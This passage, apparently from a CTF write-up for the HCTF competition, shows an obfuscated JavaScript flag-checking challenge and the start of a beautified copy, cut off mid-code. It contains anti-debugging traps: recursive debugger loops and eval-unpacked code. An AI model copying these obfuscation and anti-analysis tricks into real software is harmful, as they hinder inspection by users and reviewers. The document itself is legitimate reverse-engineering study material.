class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x3</span>)&gt;&gt;<span class="number">0x7</span>));_0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x3</span>)&amp;<span class="number">0x7f</span>)&gt;&gt;<span class="number">0x2</span>));_0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x3</span>)&amp;<span class="number">0x3</span>)&lt;&lt;<span class="number">0x3</span>|_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x4</span>)&gt;&gt;<span class="number">0x5</span>));_0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)](_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x4</span>)&amp;<span class="number">0x1f</span>));&#125;<span class="keyword">var</span> _0x545c12=<span class="number">0x0</span>;<span class="keyword">if</span>(_0x4ee491==<span class="number">0x1</span>)_0x545c12=<span class="number">0x6</span>;<span class="keyword">else</span> <span class="keyword">if</span>(_0x4ee491==<span class="number">0x2</span>)_0x545c12=<span class="number">0x4</span>;<span class="keyword">else</span> <span class="keyword">if</span>(_0x4ee491==<span class="number">0x3</span>)_0x545c12=<span class="number">0x3</span>;<span class="keyword">else</span> <span class="keyword">if</span>(_0x4ee491==<span class="number">0x4</span>)_0x545c12=<span class="number">0x1</span>;<span class="keyword">for</span>(_0x1e1753=<span class="number">0x0</span>;_0x1e1753&lt;_0x545c12;_0x1e1753++)_0x4dc510[_0xa180(<span class="string">&#x27;0x2f&#x27;</span>)]();<span class="keyword">for</span>(_0x1e1753=<span class="number">0x0</span>;_0x1e1753&lt;_0x545c12;_0x1e1753++)_0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](<span class="string">&#x27;=&#x27;</span>);(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;(<span class="function"><span class="keyword">function</span> <span class="title">_0x3c3bd8</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;(<span class="function"><span class="keyword">function</span> <span class="title">_0x4dc510</span>(<span class="params">_0x460a91</span>)</span>&#123;<span class="keyword">if</span>((<span class="string">&#x27;&#x27;</span>+_0x460a91/_0x460a91)[_0xa180(<span class="string">&#x27;0x30&#x27;</span>)]!==<span class="number">0x1</span>||_0x460a91%<span class="number">0x14</span>===<span class="number">0x0</span>)&#123;(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;[<span class="string">&#x27;constructor&#x27;</span>](<span class="string">&#x27;debugger&#x27;</span>)());&#125;<span class="keyword">else</span>&#123;<span class="keyword">debugger</span>;&#125;_0x4dc510(++_0x460a91);&#125;(<span class="number">0x0</span>));&#125;<span class="keyword">catch</span>(_0x30f185)&#123;<span class="built_in">setTimeout</span>(_0x3c3bd8,<span class="number">0x1388</span>);&#125;&#125;());&#125;());<span class="keyword">return</span> _0x4dc510[_0xa180(<span class="string">&#x27;0x31&#x27;</span>)](<span class="string">&#x27;&#x27;</span>);&#125;;e=_0x1c3854(b2c(_0x76e1e8[<span class="number">0x2</span>])[_0x43c8d1(<span class="number">0xe</span>)](<span class="string">&#x27;=&#x27;</span>)[<span class="number">0x0</span>])^<span class="number">0x53a3f32</span>;<span class="keyword">if</span>(e!=<span class="number">0x4b7c0a73</span>)&#123;<span class="keyword">return</span>![];&#125;f=_0x1c3854(b2c(_0x76e1e8[<span class="number">0x3</span>])[_0x43c8d1(<span class="number">0xe</span>)](<span class="string">&#x27;=&#x27;</span>)[<span class="number">0x0</span>])^e;<span class="keyword">if</span>(f!=<span class="number">0x4315332</span>)&#123;<span class="keyword">return</span>![];&#125;n=f*e*_0x76e1e8[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0x8</span>)];h=<span class="function"><span class="keyword">function</span>(<span class="params">_0x4c466e,_0x28871</span>)</span>&#123;<span class="keyword">var</span> _0x3ea581=<span class="string">&#x27;&#x27;</span>;<span class="keyword">for</span>(<span class="keyword">var</span> _0x2fbf7a=<span class="number">0x0</span>;_0x2fbf7a&lt;_0x4c466e[_0x43c8d1(<span class="number">0x8</span>)];_0x2fbf7a++)&#123;_0x3ea581+=_0x28871(_0x4c466e[_0x2fbf7a]);&#125;<span class="keyword">return</span> _0x3ea581;&#125;;j=_0x76e1e8[<span class="number">0x1</span>][_0x43c8d1(<span class="number">0xe</span>)](<span class="string">&#x27;3&#x27;</span>);<span class="keyword">if</span>(j[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0x8</span>)]!=j[<span class="number">0x1</span>][_0x43c8d1(<span class="number">0x8</span>)]||(_0x1c3854(j[<span class="number">0x0</span>])^_0x1c3854(j[<span class="number">0x1</span>]))!=<span class="number">0x1613</span>)&#123;<span class="keyword">return</span>![];&#125;k=<span class="function"><span class="params">_0xffcc52</span>=&gt;</span>_0xffcc52[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)]()*_0x76e1e8[<span class="number">0x1</span>][_0x43c8d1(<span class="number">0x8</span>)];l=h(j[<span class="number">0x0</span>],k);<span class="keyword">if</span>(l!=<span class="number">0x2f9b5072</span>)&#123;<span class="keyword">return</span>![];&#125;m=_0x1c3854(_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x0</span>,<span class="number">0x4</span>))<span class="number">-0x48a05362</span>==n%l;<span class="function"><span class="keyword">function</span> <span class="title">_0x5a6d56</span>(<span class="params">_0x5a25ab,_0x4a4483</span>)</span>&#123;<span class="keyword">var</span> _0x55b09f=<span class="string">&#x27;&#x27;</span>;<span class="keyword">for</span>(<span class="keyword">var</span> _0x508ace=<span class="number">0x0</span>;_0x508ace&lt;_0x4a4483;_0x508ace++)&#123;_0x55b09f+=_0x5a25ab;&#125;<span class="keyword">return</span> _0x55b09f;&#125;<span class="keyword">if</span>(!m||_0x5a6d56(_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x5</span>,<span class="number">0x1</span>),<span class="number">0x2</span>)==_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">-0x5</span>,<span class="number">0x4</span>)||_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">-0x2</span>,<span class="number">0x1</span>)-_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x4</span>,<span class="number">0x1</span>)!=<span class="number">0x1</span>)&#123;<span class="keyword">return</span>![];&#125;o=_0x1c3854(_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x6</span>,<span class="number">0x2</span>))[_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x2</span>)==_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x6</span>,<span class="number">0x1</span>)[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)]()*_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0x8</span>)]*<span class="number">0x5</span>;<span class="keyword">return</span> o&amp;&amp;_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x4</span>,<span class="number">0x1</span>)==<span class="number">0x2</span>&amp;&amp;_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x6</span>,<span class="number">0x2</span>)==_0x5a6d56(_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x7</span>,<span class="number">0x1</span>),<span class="number">0x2</span>);&#125;<span class="keyword">catch</span>(_0x4cbb89)&#123;<span class="built_in">console</span>[<span class="string">&#x27;log&#x27;</span>](<span class="string">&#x27;gg&#x27;</span>);<span class="keyword">return</span>![];&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> _0x5bf136=<span class="built_in">document</span>[_0xa180(<span class="string">&#x27;0x32&#x27;</span>)](_0xa180(<span class="string">&#x27;0x33&#x27;</span>))[<span class="string">&#x27;value&#x27;</span>];<span class="keyword">if</span>(_0x5bf136==<span class="string">&#x27;&#x27;</span>)&#123;<span class="built_in">console</span>[_0xa180(<span class="string">&#x27;0x34&#x27;</span>)](_0xa180(<span class="string">&#x27;0x35&#x27;</span>));<span class="keyword">return</span>![];&#125;<span class="keyword">var</span> _0x4d0e29=check(_0x5bf136);<span class="keyword">if</span>(_0x4d0e29)&#123;alert(_0xa180(<span class="string">&#x27;0x36&#x27;</span>));&#125;<span class="keyword">else</span>&#123;alert(_0xa180(<span class="string">&#x27;0x37&#x27;</span>));&#125;&#125;<span class="built_in">window</span>[<span class="string">&#x27;onload&#x27;</span>]=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">setInterval</span>(_0xa180(<span class="string">&#x27;0x38&#x27;</span>),<span class="number">0x32</span>);test();&#125;;</span><br></pre></td></tr></table></figure><p>美化一下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x180a = [<span class="string">&#x27;random&#x27;</span>, <span class="string">&#x27;charCodeAt&#x27;</span>, <span class="string">&#x27;fromCharCode&#x27;</span>, <span class="string">&#x27;parse&#x27;</span>, <span class="string">&#x27;substr&#x27;</span>, <span class="string">&#x27;\x5cw+&#x27;</span>, <span class="string">&#x27;replace&#x27;</span>, <span class="string">&#x27;(3()&#123;(3\x20a()&#123;7&#123;(3\x20b(2)&#123;9((\x27\x27+(2/2)).5!==1||2%g===0)&#123;(3()&#123;&#125;).8(\x274\x27)()&#125;c&#123;4&#125;b(++2)&#125;)(0)&#125;d(e)&#123;f(a,6)&#125;&#125;)()&#125;)();&#x27;</span>, <span class="string">&#x27;||i|function|debugger|length|5000|try|constructor|if|||else|catch||setTimeout|20&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;length&#x27;</span>, <span class="string">&#x27;join&#x27;</span>, <span class="string">&#x27;getElementById&#x27;</span>, <span class="string">&#x27;message&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;Welcome\x20to\x20HCTF:&gt;&#x27;</span>, <span class="string">&#x27;Congratulations!\x20you\x20got\x20it!&#x27;</span>, <span class="string">&#x27;Sorry,\x20you\x20are\x20wrong...&#x27;</span>, <span class="string">&#x27;window.console.clear();window.console.log(\x27Welcome\x20to\x20HCTF\x20:&gt;\x27)&#x27;</span>, <span class="string">&#x27;version&#x27;</span>, <span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;download&#x27;</span>, <span class="string">&#x27;substring&#x27;</span>, <span class="string">&#x27;push&#x27;</span>, <span class="string">&#x27;Function&#x27;</span>, <span class="string">&#x27;charAt&#x27;</span>, <span class="string">&#x27;idle&#x27;</span>, <span class="string">&#x27;pyW5F1U43VI&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;https://the-extension.com&#x27;</span>, <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;storage&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;then&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;getTime&#x27;</span>, <span class="string">&#x27;setUTCHours&#x27;</span>, <span class="string">&#x27;origin&#x27;</span>, <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;loading&#x27;</span>, <span class="string">&#x27;status&#x27;</span>, <span class="string">&#x27;removeListener&#x27;</span>, <span class="string">&#x27;onUpdated&#x27;</span>, <span class="string">&#x27;callee&#x27;</span>, <span class="string">&#x27;addListener&#x27;</span>, <span class="string">&#x27;onMessage&#x27;</span>, <span class="string">&#x27;runtime&#x27;</span>, <span class="string">&#x27;executeScript&#x27;</span>, <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;http://&#x27;</span>, <span class="string">&#x27;Url\x20error&#x27;</span>, <span class="string">&#x27;query&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;active&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0xd4b7d6, _0xad25ab</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x5e3956 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x1661d3</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (--_0x1661d3) &#123;</span><br><span class="line">            _0xd4b7d6[<span class="string">&#x27;push&#x27;</span>](_0xd4b7d6[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    _0x5e3956(++_0xad25ab);</span><br><span class="line">&#125;(_0x180a, <span class="number">0x1a2</span>));</span><br><span class="line"><span class="keyword">var</span> _0xa180 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x5c351c, _0x2046d8</span>) </span>&#123;</span><br><span class="line">    _0x5c351c = _0x5c351c - <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">var</span> _0x26f3b3 = _0x180a[_0x5c351c];</span><br><span class="line">    <span class="keyword">return</span> _0x26f3b3;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">_0x5b7c0c</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> _0x2e2f8d = [<span class="string">&#x27;code&#x27;</span>, _0xa180(<span class="string">&#x27;0x0&#x27;</span>), _0xa180(<span class="string">&#x27;0x1&#x27;</span>), _0xa180(<span class="string">&#x27;0x2&#x27;</span>), <span class="string">&#x27;invalidMonetizationCode&#x27;</span>, _0xa180(<span class="string">&#x27;0x3&#x27;</span>), _0xa180(<span class="string">&#x27;0x4&#x27;</span>), _0xa180(<span class="string">&#x27;0x5&#x27;</span>), _0xa180(<span class="string">&#x27;0x6&#x27;</span>), _0xa180(<span class="string">&#x27;0x7&#x27;</span>), _0xa180(<span class="string">&#x27;0x8&#x27;</span>), _0xa180(<span class="string">&#x27;0x9&#x27;</span>), _0xa180(<span class="string">&#x27;0xa&#x27;</span>), _0xa180(<span class="string">&#x27;0xb&#x27;</span>), _0xa180(<span class="string">&#x27;0xc&#x27;</span>), _0xa180(<span class="string">&#x27;0xd&#x27;</span>), _0xa180(<span class="string">&#x27;0xe&#x27;</span>), _0xa180(<span class="string">&#x27;0xf&#x27;</span>), _0xa180(<span class="string">&#x27;0x10&#x27;</span>), _0xa180(<span class="string">&#x27;0x11&#x27;</span>), <span class="string">&#x27;url&#x27;</span>, _0xa180(<span class="string">&#x27;0x12&#x27;</span>), _0xa180(<span class="string">&#x27;0x13&#x27;</span>), _0xa180(<span class="string">&#x27;0x14&#x27;</span>), _0xa180(<span class="string">&#x27;0x15&#x27;</span>), _0xa180(<span class="string">&#x27;0x16&#x27;</span>), _0xa180(<span class="string">&#x27;0x17&#x27;</span>), _0xa180(<span class="string">&#x27;0x18&#x27;</span>), <span class="string">&#x27;tabs&#x27;</span>, _0xa180(<span class="string">&#x27;0x19&#x27;</span>), _0xa180(<span class="string">&#x27;0x1a&#x27;</span>), _0xa180(<span class="string">&#x27;0x1b&#x27;</span>), _0xa180(<span class="string">&#x27;0x1c&#x27;</span>), _0xa180(<span class="string">&#x27;0x1d&#x27;</span>), <span class="string">&#x27;replace&#x27;</span>, _0xa180(<span class="string">&#x27;0x1e&#x27;</span>), _0xa180(<span class="string">&#x27;0x1f&#x27;</span>), <span class="string">&#x27;includes&#x27;</span>, _0xa180(<span class="string">&#x27;0x20&#x27;</span>), <span class="string">&#x27;length&#x27;</span>, _0xa180(<span class="string">&#x27;0x21&#x27;</span>), _0xa180(<span class="string">&#x27;0x22&#x27;</span>), _0xa180(<span class="string">&#x27;0x23&#x27;</span>), _0xa180(<span class="string">&#x27;0x24&#x27;</span>), _0xa180(<span class="string">&#x27;0x25&#x27;</span>), _0xa180(<span class="string">&#x27;0x26&#x27;</span>), _0xa180(<span class="string">&#x27;0x27&#x27;</span>), _0xa180(<span class="string">&#x27;0x28&#x27;</span>), _0xa180(<span class="string">&#x27;0x29&#x27;</span>), <span class="string">&#x27;toString&#x27;</span>, _0xa180(<span class="string">&#x27;0x2a&#x27;</span>), <span class="string">&#x27;split&#x27;</span>];</span><br><span class="line">        <span class="keyword">var</span> _0x50559f = _0x5b7c0c[_0x2e2f8d[<span class="number">0x5</span>]](<span class="number">0x0</span>, <span class="number">0x4</span>);</span><br><span class="line">        <span class="keyword">var</span> _0x5cea12 = <span class="built_in">parseInt</span>(btoa(_0x50559f), <span class="number">0x20</span>);</span><br><span class="line">        <span class="built_in">eval</span>(<span class="function"><span class="keyword">function</span> (<span class="params">_0x200db2, _0x177f13, _0x46da6f, _0x802d91, _0x2d59cf, _0x2829f2</span>) </span>&#123;</span><br><span class="line">            _0x2d59cf = <span class="function"><span class="keyword">function</span> (<span class="params">_0x4be75f</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> _0x4be75f[<span class="string">&#x27;toString&#x27;</span>](_0x177f13);</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="string">&#x27;&#x27;</span> [<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/^/</span>, <span class="built_in">String</span>)) &#123;</span><br><span class="line">                <span class="keyword">while</span> (_0x46da6f--) _0x2829f2[_0x2d59cf(_0x46da6f)] = _0x802d91[_0x46da6f] || _0x2d59cf(_0x46da6f);</span><br><span class="line">                _0x802d91 = [</span><br><span class="line">                    <span class="function"><span class="keyword">function</span> (<span class="params">_0x5e8f1a</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> _0x2829f2[_0x5e8f1a];</span><br><span class="line">                    &#125;</span><br><span class="line">                ];</span><br><span class="line">                _0x2d59cf = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> _0xa180(<span class="string">&#x27;0x2b&#x27;</span>);</span><br><span class="line">                &#125;;</span><br><span class="line">                _0x46da6f = <span class="number">0x1</span>;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">while</span> (_0x46da6f--)</span><br><span class="line">                <span class="keyword">if</span> (_0x802d91[_0x46da6f]) _0x200db2 = _0x200db2[_0xa180(<span class="string">&#x27;0x2c&#x27;</span>)](<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&#x27;\x5cb&#x27;</span> + _0x2d59cf(_0x46da6f) + <span class="string">&#x27;\x5cb&#x27;</span>, <span class="string">&#x27;g&#x27;</span>), _0x802d91[_0x46da6f]);</span><br><span class="line">            <span class="keyword">return</span> _0x200db2;</span><br><span class="line">        &#125;(_0xa180(<span class="string">&#x27;0x2d&#x27;</span>), <span class="number">0x11</span>, <span class="number">0x11</span>, _0xa180(<span class="string">&#x27;0x2e&#x27;</span>)[<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;|&#x27;</span>), <span class="number">0x0</span>, &#123;&#125;));</span><br><span class="line">        (<span class="function"><span class="keyword">function</span> (<span class="params">_0x3291b7, _0xced890</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> _0xaed809 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x3aba26</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">while</span> (--_0x3aba26) &#123;</span><br><span class="line">                    _0x3291b7[_0xa180(<span class="string">&#x27;0x4&#x27;</span>)](_0x3291b7[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            _0xaed809(++_0xced890);</span><br><span class="line">        &#125;(_0x2e2f8d, _0x5cea12 % <span class="number">0x7b</span>));</span><br><span class="line">        <span class="keyword">var</span> _0x43c8d1 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x3120e0</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> _0x3120e0 = <span class="built_in">parseInt</span>(_0x3120e0, <span class="number">0x10</span>);</span><br><span class="line">            <span class="keyword">var</span> _0x3a882f = _0x2e2f8d[_0x3120e0];</span><br><span class="line">            <span class="keyword">return</span> _0x3a882f;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">var</span> _0x1c3854 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x52ba71</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> _0x52b956 = <span class="string">&#x27;0x&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> _0x59c050 = <span class="number">0x0</span>; _0x59c050 &lt; _0x52ba71[_0x43c8d1(<span class="number">0x8</span>)]; _0x59c050++) &#123;</span><br><span class="line">                _0x52b956 += _0x52ba71[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x59c050)[_0x43c8d1(<span class="number">0xc</span>)](<span class="number">0x10</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> _0x52b956;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">var</span> _0x76e1e8 = _0x5b7c0c[_0x43c8d1(<span class="number">0xe</span>)](<span class="string">&#x27;_&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> _0x34f55b = (_0x1c3854(_0x76e1e8[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">-0x2</span>, <span class="number">0x2</span>)) ^ _0x1c3854(_0x76e1e8[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>))) % _0x76e1e8[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0x8</span>)] == <span class="number">0x5</span>;</span><br><span class="line">        <span class="keyword">if</span> (!_0x34f55b) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        b2c = <span class="function"><span class="keyword">function</span> (<span class="params">_0x3f9bc5</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> _0x3c3bd8 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&#x27;</span>;</span><br><span class="line">            <span class="keyword">var</span> _0x4dc510 = [];</span><br><span class="line">            <span class="keyword">var</span> _0x4a199f = <span class="built_in">Math</span>[_0xa180(<span class="string">&#x27;0x25&#x27;</span>)](_0x3f9bc5[_0x43c8d1(<span class="number">0x8</span>)] / <span class="number">0x5</span>);</span><br><span class="line">            <span class="keyword">var</span> _0x4ee491 = _0x3f9bc5[_0x43c8d1(<span class="number">0x8</span>)] % <span class="number">0x5</span>;</span><br><span class="line">            <span class="keyword">if</span> (_0x4ee491 != <span class="number">0x0</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> _0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; <span class="number">0x5</span> - _0x4ee491; _0x1e1753++) &#123;</span><br><span class="line">                    _0x3f9bc5 += <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                _0x4a199f += <span class="number">0x1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (_0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; _0x4a199f; _0x1e1753++) &#123;</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)](_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span>) &gt;&gt; <span class="number">0x3</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span>) &amp; <span class="number">0x7</span>) &lt;&lt; <span class="number">0x2</span> | _0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x1</span>) &gt;&gt; <span class="number">0x6</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x1</span>) &amp; <span class="number">0x3f</span>) &gt;&gt; <span class="number">0x1</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x1</span>) &amp; <span class="number">0x1</span>) &lt;&lt; <span class="number">0x4</span> | 